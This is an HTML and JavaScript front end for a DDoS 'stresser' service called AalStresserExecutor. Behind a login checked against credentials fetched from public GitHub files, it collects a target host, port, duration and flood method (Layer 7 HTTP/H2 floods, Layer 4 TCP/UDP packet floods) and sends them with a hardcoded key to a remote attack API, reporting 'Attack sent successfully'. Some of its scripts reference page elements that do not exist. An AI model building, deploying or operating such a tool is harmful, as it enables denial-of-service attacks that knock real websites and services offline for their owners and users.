
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>AalStresserExecutor - Extra Version</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #000000;
      font-family: 'Poppins', sans-serif;
      color: #ffffff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      overflow: hidden;
      padding: 20px;
    }
    .card {
      background: #1a1a1a; color: #ffffff; box-shadow: none;
      padding: 40px 30px;
      border-radius: 20px;
      box-shadow: 0 0 25px rgba(0, 216, 255, 0.3);
      width: 100%;
      max-width: 420px;
      
    }
    
    h2 { text-align: center; margin-bottom: 20px; color: #00d8ff; font-weight: 600; }
    label { margin-top: 15px; font-size: 14px; color: #90caf9; display: block; }
    input, select {
      width: 100%; padding: 12px; margin-top: 8px;
      border-radius: 10px; border: 1px solid #1e2b45;
      background: #222222; color: #ffffff; border: 1px solid #444444; font-size: 14px; transition: 0.3s;
    }
    input:focus, select:focus { outline: none; border-color: #00d8ff; box-shadow: 0 0 8px #00d8ff80; }
    .rainbow-btn {
  animation: rainbow 4s infinite;
}

button {
      margin-top: 25px; width: 100%; padding: 12px;
      background: #000000; color: #ffffff; font-size: 16px; font-weight: 600;
      border: none; border-radius: 10px; cursor: pointer; transition: 0.3s;
    }
    button:hover { background: #555555; }
    #result { margin-top: 20px; display: none; text-align: center; font-size: 14px; }
    .loader {
      border: 5px solid #f3f3f3; border-top: 5px solid #00d8ff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto;
    }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    @media (max-width: 500px) {
      .card { padding: 30px 20px; }
    }
  
@keyframes rainbow {
  0% { background-color: #ff4d4d; }
  25% { background-color: #ffcc00; }
  50% { background-color: #33cc33; }
  75% { background-color: #3399ff; }
  100% { background-color: #cc33cc; }
}

</style>
</head>
<body>

<div id="login" class="card">
  <div id="clock-emoji" style="text-align:center; margin-bottom: 15px; font-size: 24px;"></div><h2>Login</h2>
  <label>Username</label>
  <input type="text" id="login-username" placeholder="Enter username">
  <label>Password</label>
  <input type="password" id="login-password" placeholder="Enter password">
  <button onclick="validateLogin()">Login</button>
  <div id="login-loader" style="display:none;" class="loader"></div>
</div>

<div id="main" class="card" style="display:none;">
  <div id="clock-emoji-main" style="text-align:center; margin-bottom: 15px; font-size: 24px;"></div><h2>üñ•Ô∏è AalStresserExecutor üíª</h2>
  <label>üåê HOST</label>
  <input type="text" id="host" placeholder="https://google.com">
  <label>üìç PORT</label>
  <input type="number" id="port" placeholder="443">
  <label>‚è±Ô∏è TIME</label>
  <input type="number" id="time" placeholder="999999">
  <label>üí£ ATTACK METHOD</label>
  <select id="method">
    <optgroup label="LAYER 7">
      <option value="flood">FLOOD</option>
      <option value="glory">GLORY</option>
      <option value="zero-net">ZERO-NET</option>
      <option value="h2-sanz">H2-SANZ</option>
      <option value="mix">MIX</option>
    </optgroup>
    <optgroup label="LAYER 4">
      <option value="tcp-pps">TCP-PPS</option>
      <option value="udp-pps">UDP-PPS</option>
    </optgroup>
  </select>
  <button onclick="generateAPI()" class="rainbow-btn">Confirm</button>
  <div id="result"></div>
</div>

<script>
async function loadCredentials() {
  try {
    const [usernameRes, passwordRes] = await Promise.all([
      fetch("https://raw.githubusercontent.com/Renzuis/username2.txt/refs/heads/main/username2.txt"),
      fetch("https://raw.githubusercontent.com/Renzuis/password2/refs/heads/main/password2.txt")
    ]);
    document.getElementById("username").value = (await usernameRes.text()).trim();
    document.getElementById("password").value = (await passwordRes.text()).trim();
  } catch { Swal.fire('Error', 'Failed to load credentials.', 'error'); }
}

async function validateLogin() {
  const username = document.getElementById("login-username").value.trim();
  const password = document.getElementById("login-password").value.trim();
  const loader = document.getElementById("login-loader");

  if (!username || !password) {
    Swal.fire('Warning', 'Please fill in all fields.', 'warning');
    return;
  }

  loader.style.display = "block";

  try {
    const [userRes, passRes] = await Promise.all([
      fetch("https://raw.githubusercontent.com/Ambroj/login-data/refs/heads/main/username2.txt"),
      fetch("https://raw.githubusercontent.com/Ambroj/Pswrd/refs/heads/main/password2.txt")
    ]);

    const validUser = (await userRes.text()).trim();
    const validPass = (await passRes.text()).trim();

    if (username === validUser && password === validPass) {
      Swal.fire('Success', 'Login Successful!', 'success');
      document.getElementById("login").style.display = "none";
      document.getElementById("main").style.display = "block";
    } else {
      Swal.fire('Error', 'Invalid username or password.', 'error');
    }
  } catch {
    Swal.fire('Error', 'Login failed.', 'error');
  } finally {
    loader.style.display = "none";
  }
}

async function generateAPI() {
  const host = document.getElementById("host").value;
  const port = document.getElementById("port").value;
  const time = document.getElementById("time").value;
  const method = document.getElementById("method").value;
  const resultDiv = document.getElementById("result");

  if (!host || !port || !time || !method) {
    Swal.fire('Warning', 'Please complete all fields.', 'warning');
    return;
  }

  Swal.showLoading();

  const apis = ["http://kyxzen.publichosting.my.id:2016/api/Renzuis"];
  const params = `?key=Renzuis&host=${host}&port=${port}&time=${time}&method=${method}`;

  let success = 0;
  let failed = 0;

  for (const api of apis) {
    try {
      const response = await fetch(api + params);
      if (response.ok) { success++; } else { failed++; }
    } catch { failed++; }
  }

  Swal.close();

  resultDiv.style.display = "block";
  resultDiv.innerHTML = `<p>Attack Info:</p>
    <p>Host: ${host}</p>
    <p>Port: ${port}</p>
    <p>Time: ${time}</p>
    <p>Method: ${method.toUpperCase()}</p>`;

  if (success > 0 && failed === 0) {
    Swal.fire('Success', 'Attack sent successfully!', 'success');
  } else {
    Swal.fire('Error', 'Some attacks failed to send.', 'error');
  }
}

window.onload = loadCredentials;
</script>


<script>
  function updateClock() {
    const now = new Date();
    const timeString = now.toLocaleTimeString();
    document.getElementById('clock').textContent = "Current Time: " + timeString;
  }
  setInterval(updateClock, 1000);
  updateClock();
</script>


<script>
  const emojiClocks = ["üïõ","üïê","üïë","üïí","üïì","üïî","üïï","üïñ","üïó","üïò","üïô","üïö"];
  function updateEmojiClock() {
    const date = new Date();
    const hour = date.getHours() % 12;
    const minutes = date.getMinutes();
    const index = (hour + (minutes >= 30 ? 1 : 0)) % 12;
    const emoji = emojiClocks[index];
    const targets = document.querySelectorAll("#clock-emoji, #clock-emoji-main");
    targets.forEach(el => el.textContent = emoji);
  }
  setInterval(updateEmojiClock, 1000);
  updateEmojiClock();
</script>

</body>
</html>
